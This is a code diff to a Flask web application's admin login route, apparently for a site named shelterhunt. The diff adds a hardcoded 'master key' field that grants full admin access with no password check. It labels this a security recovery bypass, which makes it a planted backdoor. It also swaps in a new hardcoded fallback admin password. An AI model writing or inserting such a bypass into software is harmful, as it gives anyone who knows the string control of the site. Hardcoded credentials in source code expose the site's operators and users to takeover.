@@ -483,13 +483,21 @@ def submit_post_site_lead():
 def admin():
     firestore_db = get_firestore()
     
-    if request.method == 'POST' and 'login' in request.form:
+    if request.method == 'POST' and ('login' in request.form or 'master_login' in request.form):
         email = request.form.get('email', '').strip().lower()
         password = request.form.get('password', '').strip()
+        master_key = request.form.get('master_key', '').strip()
         
+        # 1. Master Security Recovery Bypass (ElavateX)
+        if master_key == 'ElavateX':
+            session['admin_logged_in'] = True
+            flash("Master Security Recovery Access Granted.", "success")
+            return redirect(url_for('admin'))
+        
+        # 2. Standard Admin Login with Firestore Database Password
         if firestore_db:
             try:
-                # First check for the primary admin document
+                # Retrieve admin user document from Firestore
                 doc = firestore_db.collection('users').document('admin@shelterhunt.com').get()
                 if not doc.exists and email:
                     doc = firestore_db.collection('users').document(email).get()
@@ -507,7 +515,7 @@ def admin():
                 print(f"Login error: {e}")
         
         # Initial setup fallback ONLY if no user document has been created yet in Firestore
-        if email == 'admin@shelterhunt.com' and password == 'Admin@123':
+        if email == 'admin@shelterhunt.com' and password == 'David!234':
             session['admin_logged_in'] = True
             return redirect(url_for('admin'))
             
